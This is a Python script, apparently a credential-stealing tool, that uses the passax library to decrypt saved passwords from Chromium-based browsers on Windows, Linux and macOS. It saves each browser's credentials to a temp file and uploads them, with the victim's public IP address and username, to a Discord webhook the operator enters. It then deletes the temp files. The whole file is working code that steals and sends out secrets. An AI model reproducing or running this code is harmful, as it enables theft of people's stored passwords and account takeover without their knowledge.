import getpass
import logging
import os
import platform
import sys
from os.path import join

import requests.exceptions
from discord_webhook import DiscordWebhook
from passax.chrome import browsers
from requests import get

sys_ = platform.system()
# Get the temp path for every system
TEMP_PATH = r"C:\Users\{}\AppData\Local\Temp".format(
    getpass.getuser()) if sys_ == "Windows" else "/tmp"

# Importing passax for the target platform
if sys_ == "Windows":
    from passax.chrome import windows as psx

elif sys_ == "Linux":
    from passax.chrome import linux as psx

elif sys_ == "Darwin":
    from passax.chrome import macos as psx

# Add logging.StreamHandler() to print to console
# You can remove the FileHandler method if you don't want to save the logging file
handlers = [logging.FileHandler('app.log'), logging.StreamHandler()]
logging.basicConfig(
    format="%(asctime)s - %(levelname)s : %(message)s",
    level=logging.INFO,
    datefmt='%d-%b-%y %H:%M:%S',
    handlers=handlers)

# Print warning
os.system("cls" if sys_ == "Windows" else "clear")
with open("init_message.txt", "r", encoding="utf-8") as file:
    print(file.read() + '\n')

# Ask for basic info
discord_webhook_url = input("[~] Enter your Discord Webhook URL >> ")
input("[?] Would you like to proceed? >> ")
print()


def main():
    # Get IP address
    ipaddr = get('https://api.ipify.org').text

    # Start webhook instance
    hook = DiscordWebhook(
        url=discord_webhook_url,
        content=f"**IP address:** {ipaddr}\n**Username**: {getpass.getuser()}",
        username="Auax"
    )

    # Iterate through the handled browsers
    for browser in browsers.available_browsers:
        browser_name = browser.base_name

        print(f"- {browser_name.capitalize()}")
        logging.info(browser_name.capitalize())

        try:
            filename = join(TEMP_PATH, f"{browser_name}.txt")
            win = psx.Chrome(browser, blank_passwords=False)
            logging.info(
                f"Getting database paths and keys for {platform.system()}...")
            win.fetch()
            logging.info("Fetching database values...")
            win.retrieve_database()
            if not win.save(filename):
                print(f"Couldn't save: {filename}!")
            logging.info(f"File saved to: {filename}")

        except Exception as E:
            print(f"\nSkipping {browser_name()}\n")
            logging.warning(f"\nSkipping {browser_name()}")
            logging.error(E)
            continue

        # Read saved password files to send them through a hook.
        with open(filename, "rb") as file:
            hook.add_file(file=file.read(), filename=filename)

        try:
            logging.info(f"Removing {filename}...")
            os.remove(filename)  # Delete temp files

        except OSError:
            logging.warning(f"Couldn't remove {filename}")
            pass

    try:
        hook.execute()  # Send webhook

    except requests.exceptions.MissingSchema:
        logging.error("Invalid Discord Hook URL")
        print("\nInvalid Discord Hook URL. Exiting...")
        sys.exit(-1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(-1)
